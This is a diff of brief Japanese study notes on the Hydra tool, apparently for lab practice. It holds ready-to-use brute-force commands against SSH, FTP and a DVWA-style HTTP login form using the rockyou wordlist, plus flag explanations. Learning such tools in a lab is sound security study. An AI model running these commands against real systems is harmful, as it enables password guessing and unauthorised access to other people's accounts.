@@ -1,6 +1,12 @@
 //基本のコマンド
 hydra -l username -P /usr/share/wordlist/rockyou.txt ssh://<targetIP> #sshの総当たり
 hydra -l username -P /usr/share/wordlist/rockyou.txt ftp://<targetIP> #ftpの総当たり
+-l #特定のユーザ
+-L #ユーザリストの利用
+-p #特定のパス
+-P #パスワードリストの利用
+-t #並列処理数（４が最適）
+
 
 //httpへの総当たり
 hydra #hydraコマンド
@@ -13,5 +19,5 @@ http-get-form #ＧＥＴリクエスト
 :H=Cookie:PHPSESSID=<cookie>; security=low #リクエストヘッダ
 :F=Username and/or password incorrect." #ログイン失敗時のメッセージ
 
-hydra hydra <target IP> -s 80 -l admin -P /usr/share/wordlist/rockyou.txt http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=<cookie>; security=low:F=Username and/or password incorrect."
+hydra <target IP> -s 80 -l admin -P /usr/share/wordlist/rockyou.txt http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=<cookie>; security=low:F=Username and/or password incorrect."
   
